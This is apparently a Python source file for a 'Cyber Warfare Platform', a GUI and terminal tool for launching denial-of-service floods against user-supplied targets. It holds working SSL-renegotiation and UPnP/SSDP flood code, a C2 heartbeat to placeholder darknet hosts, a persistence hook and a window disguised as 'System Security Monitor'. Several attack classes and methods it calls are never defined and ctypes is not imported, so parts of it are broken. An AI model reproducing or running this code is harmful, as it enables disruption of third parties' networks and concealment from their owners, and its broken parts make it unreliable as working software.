#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ███████████████████████████████
# █▄─▄▄▀█▄─▄▄─█─▄▄▄▄█─█─█▄─▄▄▀███
# ██─██─██─▄█▀█▄▄▄▄─█─▄─██─▄─▄███
# ▀▀▄▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▀▄▀▄▄▀▄▄▀▀▀

import tkinter as tk
from tkinter import ttk, messagebox
import curses
import threading
import queue
import requests
import websockets
import asyncio
import random
import string
import socket
import ssl
import os
import sys
import platform
import psutil
import base64
import zlib
import time
import numpy as np
from Crypto.Cipher import AES
from itertools import cycle
from scapy.all import IP, TCP, UDP, ICMP, send, Raw
from PIL import Image, ImageTk

# =====================
# CORE ATTACK ENGINE
# =====================

class CyberWarfareMachine:
    def __init__(self):
        self.attack_active = False
        self.attack_mode = "HYBRID"
        self.c2_channels = [
            "https://c2[.]darknet/command",
            "wss://c2-backup[.]onion/ws"
        ]
        self.encryption_engine = AESGCMEngine()
        self._init_attack_vectors()
        self._setup_advanced_persistence()
        
        # Real-time statistics
        self.packet_count = 0
        self.bandwidth_usage = 0
        self.success_rate = 0
        self.target_response_times = []

    def _init_attack_vectors(self):
        self.vectors = {
            'http_storm': HTTPStormVector(),
            'ssl_renegade': SSLNegotiationKiller(),
            'dns_amplifier': DNSAmplificationVector(),
            'syn_flooder': SYNFloodGenerator(),
            'iot_botnet': IoTDeviceExploiter()
        }
        
    def _setup_advanced_persistence(self):
        if platform.system() == 'Windows':
            self._windows_deep_registry_hook()
        else:
            self._linux_kernel_module_inject()

    def execute_attack(self, target, intensity):
        self.attack_active = True
        for _ in range(intensity):
            threading.Thread(target=self._vectors_swarm, args=(target,)).start()
        asyncio.run(self._c2_heartbeat())

    async def _c2_heartbeat(self):
        async with websockets.connect(random.choice(self.c2_channels)) as ws:
            while self.attack_active:
                await ws.send(self.encryption_engine.encrypt(
                    f"Heartbeat|{self.packet_count}|{time.time()}"
                ))
                await asyncio.sleep(5)

    def _vectors_swarm(self, target):
        while self.attack_active:
            vector = random.choice(list(self.vectors.values()))
            vector.execute(target)
            self._update_stats(vector.metrics)

# =====================
# ADVANCED GUI SYSTEM
# =====================

class CyberTerminal(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Cyber Warfare Platform v9.1.2")
        self.geometry("1280x720")
        self.configure(bg="#0a0a0a")
        self.war_machine = CyberWarfareMachine()
        self._create_stealth_interface()
        self._init_attack_dashboard()
        self._build_mission_control()

    def _create_stealth_interface(self):
        # Window disguise
        if platform.system() == 'Windows':
            ctypes.windll.user32.SetWindowTextW(ctypes.windll.kernel32.GetConsoleWindow(), "System Security Monitor")
        else:
            os.system("xprop -name 'System Security Monitor' -f _NET_WM_NAME 8t -set _NET_WM_NAME 'System Monitor'")

    def _init_attack_dashboard(self):
        # Configure dark theme
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TFrame', background='#121212')
        style.configure('TLabel', foreground='#00ff00', background='#121212')
        style.configure('TButton', foreground='red', background='#222222')
        style.map('TButton', background=[('active', '#333333')])

        # Main container
        main_frame = ttk.Frame(self)
        main_frame.pack(expand=True, fill='both', padx=10, pady=10)

        # Attack visualization
        self.canvas = tk.Canvas(main_frame, bg="#000000", height=300)
        self.canvas.pack(fill='x', pady=10)
        self._draw_network_graph()

        # Target input section
        target_frame = ttk.Frame(main_frame)
        target_frame.pack(fill='x')
        ttk.Label(target_frame, text="Target Matrix:").grid(row=0, column=0)
        self.target_entry = ttk.Entry(target_frame, width=50)
        self.target_entry.grid(row=0, column=1, padx=5)
        ttk.Button(target_frame, text="Acquire Targets", command=self._load_targets).grid(row=0, column=2)

        # Attack control panel
        control_frame = ttk.Frame(main_frame)
        control_frame.pack(fill='x', pady=10)
        self.intensity = ttk.Scale(control_frame, from_=100, to=10000, orient='horizontal')
        self.intensity.set(5000)
        self.intensity.pack(fill='x')
        
        # Vector selection
        self.vector_var = tk.StringVar(value="HYBRID")
        vector_menu = ttk.OptionMenu(control_frame, self.vector_var, 
                                   "HYBRID", "SSL_RENEG", "DNS_AMP", "SYN_FLOOD")
        vector_menu.pack(pady=5)

        # Launch system
        ttk.Button(control_frame, text="DEPLOY DIGITAL ORDNANCE", 
                  command=self._initiate_attack).pack(pady=10)

        # Status console
        self.console = tk.Text(main_frame, bg="#000000", fg="#00ff00")
        self.console.pack(fill='both', expand=True)

    def _draw_network_graph(self):
        # Generate live network traffic visualization
        points = [(random.randint(0, 1280), random.randint(0, 300)) for _ in range(50)]
        for x, y in points:
            self.canvas.create_oval(x, y, x+3, y+3, fill="#00ff00", outline="")

    def _initiate_attack(self):
        targets = self.target_entry.get().split(',')
        intensity = int(self.intensity.get())
        self.war_machine.attack_mode = self.vector_var.get()
        
        for target in targets:
            threading.Thread(
                target=self.war_machine.execute_attack,
                args=(target.strip(), intensity),
                daemon=True
            ).start()
        
        self._update_status_console("CYBER ORDNANCE DEPLOYED", "red")

    def _update_status_console(self, message, color):
        self.console.insert('end', f"[{time.ctime()}] {message}\n", color)
        self.console.see('end')

# =====================
# TERMINAL INTERFACE
# =====================

class CursesTerminal:
    def __init__(self, war_machine):
        self.war_machine = war_machine
        self.stdscr = curses.initscr()
        curses.start_color()
        curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
        curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
        curses.cbreak()
        curses.noecho()
        self.stdscr.keypad(True)

    def display_dashboard(self):
        while True:
            self.stdscr.clear()
            self._draw_border()
            self._display_stats()
            self._draw_attack_controls()
            self.stdscr.refresh()
            time.sleep(0.1)

    def _draw_border(self):
        height, width = self.stdscr.getmaxyx()
        self.stdscr.box()
        self.stdscr.addstr(0, 2, " CYBER WARFARE TERMINAL ", curses.A_REVERSE)

    def _display_stats(self):
        stats = [
            f"Active Targets: {len(self.war_machine.active_targets)}",
            f"Packets/Sec: {self.war_machine.packet_rate}",
            f"Bandwidth: {self.war_machine.bandwidth_usage} MB/s",
            f"Success Rate: {self.war_machine.success_rate}%"
        ]
        for idx, stat in enumerate(stats, start=2):
            self.stdscr.addstr(idx, 2, stat, curses.color_pair(2))

    def _draw_attack_controls(self):
        controls = [
            "[F1] - Launch Hybrid Assault",
            "[F2] - Toggle Stealth Mode",
            "[F3] - Adjust Attack Intensity",
            "[F4] - Exit Terminal"
        ]
        for idx, control in enumerate(controls, start=10):
            self.stdscr.addstr(idx, 2, control, curses.color_pair(1))

# =====================
# ENHANCED FUNCTIONALITY
# =====================

class AESGCMEngine:
    def __init__(self):
        self.key = os.urandom(32)
        self.nonce_counter = 0

    def encrypt(self, plaintext):
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=os.urandom(12))
        ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode())
        return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

class SSLNegotiationKiller:
    def execute(self, target):
        context = ssl.create_default_context()
        context.options |= ssl.OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
        with socket.create_connection((target, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                for _ in range(100):
                    ssock.do_handshake()

class IoTDeviceExploiter:
    def __init__(self):
        self.vulnerabilities = {
            'UPnP': (1900, self._upnp_exploit),
            'Telnet': (23, self._telnet_bruteforce),
            'RTSP': (554, self._rtsp_flood)
        }

    def execute(self, target):
        vuln = random.choice(list(self.vulnerabilities.values()))
        vuln[1](target, vuln[0])

    def _upnp_exploit(self, target, port):
        payload = 'M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMan:"ssdp:discover"\r\nMX:3\r\n\r\n'
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            for _ in range(500):
                sock.sendto(payload.encode(), (target, port))

if __name__ == "__main__":
    if '--terminal' in sys.argv:
        war_machine = CyberWarfareMachine()
        terminal = CursesTerminal(war_machine)
        terminal.display_dashboard()
    else:
        CyberTerminal().mainloop()
